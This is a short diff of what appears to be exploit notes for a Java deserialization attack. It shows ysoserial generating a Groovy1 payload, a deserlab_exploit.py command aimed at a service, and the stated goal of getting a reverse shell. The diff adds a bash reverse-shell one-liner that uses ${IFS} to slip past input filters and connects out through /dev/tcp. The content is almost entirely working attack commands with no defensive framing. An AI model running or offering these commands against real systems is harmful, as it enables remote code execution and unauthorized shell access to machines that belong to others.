@@ -6,3 +6,7 @@ java -jar ysoserial-master-SNAPSHOT.jar Groovy1 'python /tmp/1.py 10.200.100.249
 python deserlab_exploit.py 127.0.0.1 89 payload2
 
 get a reverse shell!
+
+
+/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/127.0.0.1/8888<&1
+
